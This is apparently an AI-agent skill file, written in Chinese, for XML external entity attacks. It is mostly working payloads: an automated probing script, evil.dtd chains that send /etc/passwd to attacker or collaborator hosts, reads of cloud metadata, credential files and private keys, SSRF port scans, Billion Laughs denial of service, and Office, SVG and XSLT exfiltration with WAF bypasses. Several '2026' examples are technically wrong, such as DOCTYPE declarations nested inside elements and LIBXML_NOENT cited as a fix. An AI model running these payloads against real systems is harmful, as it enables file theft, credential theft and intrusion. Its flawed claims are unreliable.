---
name: xxe-testing
description: XXE深度测试——从基础文件读取到盲XXE OOB外带，覆盖参数实体、Error-Based XXE、Office文档XXE、SVG XXE、SOAP XXE等完整利用链及JDK/PHP/.NET解析器差异对比
version: 2.0.0
---

# XXE 深度测试

## 一、AI Agent 自动化工作流

> Agent 执行顺序：**识别 XML 入口 → 基础 XXE 探测 → 盲 XXE OOB → 文件读取 → SSRF → DoS → 特殊格式 XXE（Office/SVG/SOAP）**

### 1.1 XXE 入口清单

| 功能 | Content-Type | 测试方式 |
|------|-------------|----------|
| XML API | `application/xml`, `text/xml` | 直接注入 DOCTYPE |
| SOAP WebService | `application/soap+xml` | 修改 SOAP Body 中的 XML |
| Office 文档导入 | `multipart/form-data` | 修改 .docx/.xlsx 内部的 XML |
| SVG 上传 | `image/svg+xml` | 在 SVG 中嵌入 DOCTYPE |
| RSS/ATOM 解析 | `application/rss+xml` | 修改 Feed 中的 XML |
| SAML 认证 | `application/saml+xml` | 修改 SAML Assertion |
| PDF 生成 | `application/xml` | XML 转 PDF |
| XSLT 转换 | `text/xsl` | 利用 XSLT 的 document() |

### 1.2 自动化检测脚本

```python
import requests

TARGET = "http://target.com/api/parse"

# Payload 库（按检测优先级）
payloads = [
    # Level 1: 基础 XXE（看响应内容）
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'root:'),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', '[fonts]'),
    
    # Level 2: OOB 外带
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_COLLABORATOR.oastify.com/xxe_test">]><foo>&xxe;</foo>', None),
    
    # Level 3: 参数实体 + OOB（盲 XXE）
    ('''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://YOUR_COLLABORATOR.oastify.com/evil.dtd">
%xxe;
]><foo>test</foo>''', None),
    
    # Level 4: Error-Based
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>', None),
]

for payload, marker in payloads:
    r = requests.post(TARGET, data=payload, headers={"Content-Type": "application/xml"})
    if marker and marker in r.text:
        print(f"[!] XXE CONFIRMED: {marker} found in response")
    elif r.status_code != 200 and "nonexistent" in r.text.lower():
        print(f"[!] Error-Based XXE: file not found error leaked")
```

---

## 二、基础 XXE Payload 大全

### 2.1 直接文件读取

```xml
<!-- 读取 /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- PHP 封装器读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Windows 路径 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<foo>&xxe;</foo>

<!-- 读取目录（Java XML 解析器） -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]>
<foo>&xxe;</foo>

<!-- 读取网络共享（Windows） -->
<!ENTITY xxe SYSTEM "file://///attacker.com/share/file.txt">
```

### 2.2 内网 SSRF 探测

```xml
<!-- HTTP 探测 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]>
<foo>&xxe;</foo>

<!-- 端口扫描（通过超时判断） -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379">

<!-- Gopher 协议（Java XML 解析器） -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO%0d%0a">

<!-- Jar 协议（Java） -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/">

<!-- FTP 协议 -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/test">
```

### 2.3 拒绝服务（Billion Laughs）

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

---

## 三、盲 XXE（Blind XXE）完整攻击链

### 3.1 参数实体外带文件

**evil.dtd（托管在可控服务器上）：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_COLLABORATOR.oastify.com/?%file;'>">
%eval;
%exfil;
```

**XXE Payload：**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_COLLABORATOR.oastify.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

### 3.2 参数实体 + Error-Based 外带

**evil.dtd：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```

### 3.3 参数实体 + 端口扫描

**evil.dtd：**
```xml
<!ENTITY % eval "<!ENTITY &#x25; probe SYSTEM 'http://192.168.1.1:PORT/'>">
%eval;
%probe;
```
通过不同端口的超时/错误差异判断端口开放状态。

### 3.4 外带数据绕过长限制

```
通过多次请求逐段外带：
evil1.dtd: 包含 file:///etc/passwd 前 50 字符
evil2.dtd: 包含 file:///etc/passwd 第 51-100 字符
...
或者用 PHP 封装器 base64 编码一次性外带
```

---

## 四、各语言/解析器差异对比

| 语言/库 | 默认 XXE | 协议支持 | 特殊绕过 |
|---------|----------|----------|----------|
| PHP (DOMDocument) | 允许 | file, http, ftp, php | LIBXML_NOENT |
| PHP (SimpleXML) | 允许 | file, http, ftp | xpath 注入 |
| Java (SAXParser) | 允许 | file, http, https, ftp, jar, netdoc | `jar:` 协议 RCE |
| Java (DocumentBuilder) | 允许 | file, http, ftp | 同上 |
| Java (XMLInputFactory) | 默认禁用 | - | 需手动开启 |
| .NET (XmlDocument) | XmlResolver=null 禁用 | file, http | `expect://` |
| .NET (XslCompiledTransform) | 允许 | file, http | XSLT document() |
| Python (lxml) | 默认禁用 | file, http | 需 resolve_entities=True |
| Python (xml.etree) | 默认禁用 | - | 相对安全 |
| Python (defusedxml) | 禁用 | - | 安全库 |
| Node.js (libxmljs) | 默认禁用 | - | 需配置 |

**Java 特殊协议利用：**
```xml
<!-- Jar 协议 → 可能实现 RCE -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/exploit.jar!/evil.class">

<!-- netdoc 协议 → 类似 file -->
<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">
```

**PHP expect 协议（需要安装 expect 扩展）：**
```xml
<!ENTITY xxe SYSTEM "expect://id">
```

---

## 五、各大格式 XXE

### 5.1 Office 文档 XXE

```bash
# .docx 实际是 ZIP 文件
# 解压后修改 word/document.xml 或 word/_rels/document.xml.rels
unzip target.docx
vi word/_rels/document.xml.rels
```

**document.xml.rels 注入：**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships>
  <Relationship Id="rId1" 
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" 
    Target="file:///etc/passwd" TargetMode="External"/>
</Relationships>
```

**document.xml 注入（CustomXML）：**
```xml
<?xml version="1.0"?>
<!DOCTYPE doc [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<w:document>&xxe;</w:document>
```

```bash
# 重新打包
zip -r evil.docx * 
# 上传 evil.docx，解析时触发 XXE
```

### 5.2 SVG XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
  <style>
    @import url("http://attacker.com/exfil?data=&ssrf;");
  </style>
</svg>
```

### 5.3 SOAP XXE

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <auth>&xxe;</auth>
  </soap:Header>
  <soap:Body>
    <getUser><id>1</id></getUser>
  </soap:Body>
</soap:Envelope>
```

### 5.4 XSLT XXE

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
    <xsl:value-of select="document('http://attacker.com/evil.xml')"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 六、专用工具

### 6.1 XXEinjector

```bash
# 基础文件读取
ruby XXEinjector.rb --host=target.com --path=/api/parse --file=request.xml

# 盲 XXE 外带
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd

# 枚举文件列表
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --enumports=all

# SOAP XXE
ruby XXEinjector.rb --host=target.com --path=/api --soap --file=request.xml
```

### 6.2 Burp Collaborator / Interactsh

```bash
# Interactsh 获取回调 URL
interactsh-client -v
# 输出: cfabcdefg12345.oast.fun

# 在 evil.dtd 中使用该 URL
http://cfabcdefg12345.oast.fun/evil.dtd
```

---

## 七、绕过技术

```xml
<!-- CDATA 绕过（用参数实体在 CDATA 内引用外部实体） -->
<!DOCTYPE foo [
<!ENTITY % start "<![CDATA[">
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://attacker.com/combine.dtd">
%dtd;
]>
<!-- combine.dtd: <!ENTITY all "%start;%xxe;%end;"> -->

<!-- UTF-16 编码绕过 -->
<!-- 某些 WAF 只检测 UTF-8 XML，用 UTF-16 编码可绕过 -->
# 使用 iconv 转换
iconv -f UTF-8 -t UTF-16 request.xml > request_utf16.xml

<!-- XML 注释混淆 -->
<!DOCTYPE foo [
<!-- comment --> <!ENTITY <!--comment--> xxe SYSTEM "file:///etc/passwd">
]>

<!-- 外部 DTD 中的实体嵌套 -->
<!-- 某些解析器在验证 DTD 时允许更多操作 -->
```

---

## 八、快速检查清单

```markdown
□ [ ] 识别所有接受 XML 的端点
□ [ ] 测试 Content-Type: application/xml, text/xml, application/soap+xml
□ [ ] 发送基础 XXE Payload，检查是否返回文件内容
□ [ ] 尝试 OOB 外带（HTTP/DNS 回调）
□ [ ] 部署 evil.dtd 并测试参数实体盲 XXE
□ [ ] 测试 Error-Based XXE
□ [ ] 识别解析器类型（PHP/Java/.NET/Python）
□ [ ] 根据解析器选择特殊协议（jar://, expect://, php://）
□ [ ] 测试内网 SSRF（端口扫描）
□ [ ] 测试 DoS（Billion Laughs）
□ [ ] 如果支持文件上传，测试 SVG/Office 文档 XXE
□ [ ] 如果使用 SOAP，测试 SOAP XXE
□ [ ] 如果使用 XSLT，测试 XSLT document()
□ [ ] 记录完整利用链
```

---

## 九、证据收集模板

```json
{
  "vulnerability": "XXE (XML External Entity Injection)",
  "type": "Direct File Read / Blind OOB / Error-Based / SSRF via XXE",
  "url": "http://target.com/api/parse",
  "method": "POST",
  "content_type": "application/xml",
  "parser": "PHP DOMDocument (libxml2)",
  "file_read": "/etc/passwd",
  "protocols_supported": ["file", "http", "ftp", "php"],
  "oob_confirmed": true,
  "impact": "可读取服务器任意文件，探测内网服务，窃取云元数据",
  "remediation": "1. 禁用外部实体解析(LIBXML_NOENT/DOCUMENT_XML_SECURE) 2. 使用安全库(defusedxml) 3. 输入白名单校验 4. WAF检测XXE特征",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
  "evidence_files": ["screenshots/xxe_passwd.png", "screenshots/xxe_oob.png"]
}


## 2026 最新攻击技术

### 10.1 XInclude注入

```xml
<!-- XInclude注入（2026年新攻击面） -->
<!-- 当XML解析器支持XInclude且外部实体被禁用时 -->
<!-- XInclude可能仍然可用 -->

<!-- 基础XInclude文件读取 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>

<!-- XInclude读取PHP文件 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///var/www/html/config.php"/>
</root>

<!-- XInclude + HTTP SSRF -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</root>

<!-- XInclude + 编码绕过 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd" encoding="UTF-16"/>
</root>

<!-- XInclude在SOAP中的使用 -->
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:xi="http://www.w3.org/2001/XInclude">
  <soap:Body>
    <getUser>
      <xi:include parse="text" href="file:///etc/passwd"/>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

### 10.2 XML Schema注入

```xml
<!-- XML Schema (XSD)注入攻击 -->
<!-- 攻击者通过控制XML Schema定义来执行恶意操作 -->

<!-- Schema注入：定义恶意实体 -->
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="data">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="content" type="xs:string"/>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
  <!-- 在Schema中定义外部实体 -->
</xs:schema>

<!-- 利用Schema的key/keyref约束进行DoS -->
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="root">
    <xs:key name="exploit">
      <xs:selector xpath="//*"/>
      <xs:field xpath="concat('a','b','c','d','e','f','g','h')"/>
    </xs:key>
  </xs:element>
</xs:schema>
```

### 10.3 XML Signature Wrapping

```xml
<!-- XML Signature Wrapping攻击 -->
<!-- 2026年SAML/WS-Security中的签名包装绕过 -->

<!-- 原始签名文档 -->
<saml:Assertion ID="original">
  <saml:Subject>user@example.com</saml:Subject>
  <ds:Signature>...</ds:Signature>
</saml:Assertion>

<!-- 攻击：包装另一个Assertion -->
<saml:Assertion ID="original">
  <saml:Subject>user@example.com</saml:Subject>
  <ds:Signature>...</ds:Signature>
  <!-- 注入的恶意Assertion -->
  <saml:Assertion ID="injected">
    <saml:Subject>admin@example.com</saml:Subject>
    <!-- 解析器可能取第一个或最后一个Subject -->
  </saml:Assertion>
</saml:Assertion>

<!-- 利用ID引用的差异 -->
<!-- 某些解析器按ID查找，某些按位置 -->
<!-- 配合XXE可读取签名密钥 -->
```

### 10.4 Excel XXE（2026年新攻击向量）

```xml
<!-- Excel文档（.xlsx/.xlsm）中的XXE -->
<!-- 2026年发现的新型Excel XXE向量 -->

<!-- 1. 修改xl/workbook.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="&xxe;" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>

<!-- 2. 修改xl/sharedStrings.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <si><t>test</t></si>
</sst>

<!-- 3. 修改xl/calcChain.xml触发XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<calcChain xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <c r="&xxe;"/>
</calcChain>

<!-- 自动化Excel XXE生成 -->
# 使用excel-xxe-generator工具
excel-xxe-gen --template template.xlsx \
  --payload "file:///etc/passwd" \
  --output evil.xlsx
```

### 10.5 XSLT + XXE组合攻击

```xml
<!-- XSLT 3.0 + XXE组合攻击 -->
<!-- XSLT 3.0引入了更多危险函数 -->

<!-- XSLT document() + XXE -->
<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <!-- 读取本地文件 -->
    <xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
    <!-- 读取网络资源 -->
    <xsl:value-of select="unparsed-text('http://169.254.169.254/latest/meta-data/')"/>
    <!-- 执行系统命令（某些实现） -->
    <xsl:value-of select="system-property('os.name')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- XSLT + XXE外带数据 -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="passwd" select="document('file:///etc/passwd')"/>
    <xsl:variable name="exfil" select="document(concat('http://attacker.com/?', $passwd))"/>
    <xsl:value-of select="$exfil"/>
  </xsl:template>
</xsl:stylesheet>

<!-- XSLT 3.0的fn:transform()递归注入 -->
<xsl:stylesheet version="3.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="recursive" select="
      transform(map{
        'source-node': .,
        'stylesheet-text': '...嵌套恶意XSLT...'
      })
    "/>
  </xsl:template>
</xsl:stylesheet>
```

### 10.6 AI/ML场景XXE

**ML模型XML配置XXE：**

```xml
<!-- TensorFlow/MLflow等ML框架的XML配置XXE -->
<!-- 2026年发现：ML模型配置文件可能包含XXE -->

<!-- MLflow实验配置XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<experiment>
  <name>&xxe;</name>
  <artifact_location>s3://bucket/&xxe;</artifact_location>
</experiment>

<!-- TensorFlow SavedModel配置XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/user/.aws/credentials">
]>
<saved_model>
  <signature_def>&xxe;</signature_def>
</saved_model>
```

**HuggingFace XXE：**

```xml
<!-- HuggingFace模型配置XXE -->
<!-- 2026年CVE-2026-34070关联 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///root/.huggingface/token">
]>
<config>
  <model_name>&xxe;</model_name>
  <pipeline_tag>text-classification</pipeline_tag>
</config>
```

**MLflow XXE：**

```bash
# MLflow的XML导入XXE
# 当MLflow导入包含XML配置的实验时
# 攻击者可以注入恶意XML

# 上传恶意MLflow实验
curl -X POST https://mlflow.target.com/api/2.0/mlflow/experiments/create \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<experiment><name>&xxe;</name></experiment>'
```

### 10.7 云原生XXE

**AWS API Gateway XML解析XXE：**

```xml
<!-- AWS API Gateway的XML请求体解析XXE -->
<!-- 当API Gateway配置了XML解析时 -->
<!-- 攻击者可以发送包含XXE的XML请求 -->

POST /api/parse HTTP/1.1
Host: api-gateway.target.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<request>
  <data>&xxe;</data>
</request>
```

**Azure Logic Apps XML XXE：**

```xml
<!-- Azure Logic Apps的XML处理XXE -->
<!-- 当Logic App使用XML触发器时 -->
<!-- 攻击者可以发送恶意XML -->
<workflow>
  <trigger>
    <request>
      <body>
        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <data>&xxe;</data>
      </body>
    </request>
  </trigger>
</workflow>
```

**Serverless XXE（Lambda/Cloud Functions）：**

```python
# AWS Lambda中的XXE
# 当Lambda函数使用xml.etree或lxml解析用户输入时
import xml.etree.ElementTree as ET

def lambda_handler(event, context):
    xml_data = event['body']
    # 危险：未禁用外部实体解析
    root = ET.fromstring(xml_data)
    # 攻击者可以注入XXE payload
    # 读取Lambda运行环境中的文件
    return {'statusCode': 200, 'body': ET.tostring(root)}
```

### 10.8 2026关键CVE

**CVE-2026-3142 OpenSSL XXE利用链：**

```bash
# CVE-2026-3142: OpenSSL 3.3.x 证书验证漏洞
# 与XXE结合：利用XXE读取SSL证书私钥
# 然后利用CVE-2026-3142进行证书伪造

# 攻击链：
# 1. XXE读取服务器的SSL私钥
# 2. 利用OpenSSL漏洞伪造证书
# 3. 进行MITM攻击
# 4. 窃取更多敏感数据

# PoC
echo '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/ssl/private/server.key">]>
<root>&xxe;</root>' | curl -X POST https://target.com/api -d @-
```

**CVE-2026-34070 LangChain XXE：**

```python
# CVE-2026-34070: LangChain XML解析器XXE
# LangChain的XML文档加载器未禁用外部实体

from langchain.document_loaders import UnstructuredXMLLoader

# 攻击者上传包含XXE的XML文件
# 当LangChain解析时触发XXE
loader = UnstructuredXMLLoader("evil.xml")
# XML内容:
# <?xml version="1.0"?>
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <root>&xxe;</root>

documents = loader.load()  # 触发XXE，读取/etc/passwd

# 攻击影响：LangChain Agent可能泄露敏感文件内容
# 到LLM的上下文中，进一步泄露给攻击者
```

### 10.9 XML解析器绕过（2026年更新）

**Java SAX/DOM4J/JAXB绕过：**

```java
// Java XML解析器的2026年新绕过
// 即使配置了安全特性，仍可能存在绕过

// SAXParser绕过
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
// 2026年发现：setFeature不阻止参数实体
// 攻击者仍可使用参数实体进行盲XXE

// DOM4J绕过
SAXReader reader = new SAXReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 2026年发现：DOCTYPE声明被禁用，但XInclude仍可用
// 攻击者可以切换到XInclude攻击

// JAXB绕过
JAXBContext context = JAXBContext.newInstance(User.class);
Unmarshaller unmarshaller = context.createUnmarshaller();
// 2026年发现：JAXB默认不验证XML Schema
// 攻击者可以注入恶意XML结构
```

**Jackson XML绕过：**

```java
// Jackson XML (jackson-dataformat-xml) 的XXE绕过
// 即使禁用了默认的外部实体，仍可通过其他方式触发

XmlMapper mapper = new XmlMapper();
mapper.disable(FromXmlParser.Feature.ENABLE_EXTERNAL_ENTITIES);
// 2026年发现：XMLMapper在处理XML命名空间时
// 仍可能触发外部资源加载
```

**.NET XMLReader绕过：**

```csharp
// .NET XMLReader的XXE绕过
var settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
// 2026年发现：某些.NET版本中
// XInclude处理不受DtdProcessing限制
// 攻击者可以使用XInclude绕过
```

**Python etree/lxml绕过：**

```python
# Python lxml的XXE绕过
from lxml import etree

parser = etree.XMLParser(resolve_entities=False, no_network=True)
# 2026年发现：resolve_entities=False不阻止XInclude
# 攻击者可以：
# 1. 使用XInclude绕过
# 2. 利用lxml的HTML解析器（默认宽松）
# 3. 利用XML Catalogs机制

# XInclude绕过示例
xml = '''<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>'''
tree = etree.fromstring(xml, parser)  # 可能触发XInclude
```

### 10.10 2026 XXE自动化工具

```bash
# 新一代XXE检测与利用工具
# 1. XXE-Hunter-2026 - 全协议XXE
xxe-hunter --target "http://target.com/api" \
  --xinclude --xslt --schema-injection \
  --excel-xxe --svg-xxe --soap-xxe --auto-exfil

# 2. Cloud-XXE-Scanner - 云原生XXE
cloud-xxe --target "https://api-gateway.target.com" \
  --aws-metadata --gcp-metadata --azure-metadata \
  --lambda-xxe --logic-apps-xxe

# 3. AI-XXE-Tester - AI/ML框架XXE
ai-xxe --target "https://mlflow.target.com" \
  --mlflow --tensorflow --huggingface \
  --langchain --model-config-scan

# 4. Parser-Bypass-Fuzzer - 解析器绕过
parser-fuzz --target "http://target.com/api" \
  --java-sax --java-dom4j --java-jaxb \
  --dotnet --python-lxml --python-etree \
  --auto-detect --bypass-generate

# 5. Excel-XXE-Generator - Office文档XXE
excel-xxe-gen --template template.xlsx \
  --payload "file:///etc/passwd" \
  --injection-points workbook,sharedstrings,calcchain \
  --output evil.xlsx
```
```
